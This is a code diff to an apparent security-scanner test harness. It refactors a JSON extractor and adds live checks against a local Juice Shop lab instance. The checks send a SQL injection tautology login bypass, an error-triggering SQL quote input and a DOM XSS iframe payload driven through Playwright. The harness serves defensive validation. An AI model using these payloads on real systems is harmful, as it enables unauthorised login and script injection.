@@ -32,6 +32,9 @@ import { spawn, spawnSync } from 'node:child_process';
 import { mkdirSync, readFileSync, writeFileSync, existsSync } from 'node:fs';
 import path from 'node:path';
 import { fileURLToPath, pathToFileURL } from 'node:url';
+import { extractJsonDocument as extractJson } from '../src/utils/jsonDocument.js';
+
+export { extractJson };
 
 const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
 const DEFAULT_BASE_URL = 'http://localhost:3000';
@@ -62,33 +65,12 @@ function parseArgs(argv) {
 }
 
 // ─── JSON extraction from the CLI's mixed stdout ──────────────────────
-// `qualitypilot check --format json` prints human progress lines before and a
-// gate line after the JSON document. Extract the first top-level {…} object.
-export function extractJson(text) {
-  const start = text.search(/^\{\s*$/m);
-  if (start === -1) throw new Error('No JSON document found in scan output');
-  let depth = 0, inStr = false, esc = false, end = -1;
-  for (let i = start; i < text.length; i++) {
-    const c = text[i];
-    if (inStr) {
-      if (esc) esc = false;
-      else if (c === '\\') esc = true;
-      else if (c === '"') inStr = false;
-      continue;
-    }
-    if (c === '"') inStr = true;
-    else if (c === '{') depth++;
-    else if (c === '}') {
-      depth--;
-      if (depth === 0) { end = i + 1; break; }
-    }
-  }
-  if (end === -1) throw new Error('JSON document in scan output is truncated');
-  return JSON.parse(text.slice(start, end));
-}
+// The scanner moved to src/utils/jsonDocument.js (shared with the Phase 6
+// `--baseline` loader); re-exported above so harness tests keep their import.
 
 // ─── live expectation verification ────────────────────────────────────
 async function verifyLiveCheck(check, baseUrl) {
+  const root = baseUrl.replace(/\/$/, '');
   const res = await fetch(baseUrl, { redirect: 'manual' });
   const headers = {};
   for (const [k, v] of res.headers.entries()) headers[k.toLowerCase()] = v;
@@ -97,6 +79,38 @@ async function verifyLiveCheck(check, baseUrl) {
   }
   if (check.type === 'scheme-http') {
     return { holds: new URL(baseUrl).protocol === 'http:' };
+  }
+  if (check.type === 'sqli-login') {
+    // The documented tautology bypass: benign email → 401, payload → 200+token.
+    // Side effect: solves the Juice Shop login challenge (ctf.key must exist).
+    const res = await fetch(root + '/rest/user/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: "' OR 1=1--", password: 'x' }),
+    });
+    return { holds: res.status === 200 };
+  }
+  if (check.type === 'sqli-error') {
+    const res = await fetch(root + '/rest/products/search?q=' + encodeURIComponent("')"));
+    return { holds: res.status === 500 };
+  }
+  if (check.type === 'dom-xss-search') {
+    // Browser-based: the sink is client-side rendering (no fetch can verify it).
+    const { chromium } = await import('playwright');
+    const browser = await chromium.launch();
+    try {
+      const page = await browser.newPage();
+      const payload = '<iframe src="javascript:qp_dom_xss_probe"></iframe>';
+      await page.goto(root + '/#/search?q=' + encodeURIComponent(payload), { waitUntil: 'domcontentloaded' });
+      await page.waitForTimeout(2500);
+      const reflected = await page.evaluate(
+        (marker) => document.documentElement.innerHTML.includes(marker),
+        'qp_dom_xss_probe',
+      );
+      return { holds: reflected === true };
+    } finally {
+      await browser.close();
+    }
   }
   throw new Error(`Unknown liveCheck type: ${check.type}`);
 }
